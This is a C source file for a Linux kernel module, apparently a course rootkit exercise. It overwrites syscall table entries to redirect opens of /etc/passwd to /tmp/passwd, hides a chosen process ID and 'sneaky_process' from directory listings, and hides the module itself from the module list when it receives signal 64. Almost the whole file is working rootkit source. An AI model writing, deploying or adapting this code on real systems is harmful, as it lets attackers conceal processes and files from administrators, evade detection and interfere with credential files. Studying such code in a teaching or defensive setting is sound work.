#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#define PREFIX "sneaky_process"

struct linux_dirent {
	u64		d_ino;
	s64		d_off;
	unsigned short	d_reclen;
	unsigned char	d_type;
	char		d_name[0];
};

static char* sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "pid of sneaky module");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
    const char* tmpPath = "/tmp/passwd";
    copy_to_user((char*)(regs->si), tmpPath, strlen(tmpPath));
  }
  return (*original_openat)(regs);
}


asmlinkage int(*original_getdents64)(struct pt_regs *regs);


asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
  int nread = original_getdents64(regs);
  struct linux_dirent* dirp = (void*)(regs->si);

  int curr = 0;
  //if (nread == 0) return 0;
  while(curr < nread){
    struct linux_dirent* newdirp = (void*)dirp + curr;
    int reclen = newdirp->d_reclen;
    if(strcmp(newdirp->d_name, sneaky_pid) == 0 || strcmp(newdirp->d_name, "sneaky_process") == 0){
      printk(KERN_INFO "find sneaky_pid matched");
      //int reclen = newdirp->d_reclen;
      int leftlen = ((void*)dirp + nread) - ((void*)newdirp + reclen);
      void* next = (void*)newdirp + reclen;
      memmove((void*)(regs->si) + curr, next, leftlen);
      nread -= reclen;
    }
    else{
      curr += reclen;
    }
  }
  return nread;
}


// asmlinkage ssize_t (*original_read)(struct pt_regs*);


// asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
//   ssize_t nread = original_read(regs);

//   //if (nread == 0) return nread;
//   if (nread > 0) {
//     void* Start = strnstr((char*)(regs->si), "sneaky_mod ", nread);
//     if(Start != NULL){
//       void* End = strnstr(Start, "\n", nread - (Start - (void*)(regs->si)));
//       if(End != NULL){
//         int size = End - Start + 1;
//         memmove(Start, End + 1, nread  - (Start - (void*)(regs->si)) - size);
//         nread -= size;
//       }
//     }
//   }
//   return nread;
// }

static struct list_head *prev_module;

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}


static short hidden = 0;

static asmlinkage long (*original_kill)(const struct pt_regs *);

/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle
 * we either call hideme(), showme() or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
asmlinkage int sneaky_sys_kill(const struct pt_regs *regs)
{
    void hideme(void);
    void showme(void);
    

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) )
    {
        //printk(KERN_INFO "hiding...\n");
        hideme();
        hidden = 1;
        return 0;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        //printk(KERN_INFO "revealing...\n");
        showme();
        hidden = 0;
        return 0;
    }
    else
    {
        return original_kill(regs);
    }
    
}


// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
  //original_read = (void*)sys_call_table[__NR_read];
  original_kill = (void*)sys_call_table[__NR_kill];

  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  sys_call_table[__NR_kill] = (unsigned long)sneaky_sys_kill;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  //sys_call_table[__NR_read] = (unsigned long)original_read;
  sys_call_table[__NR_kill] = (unsigned long)original_kill;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");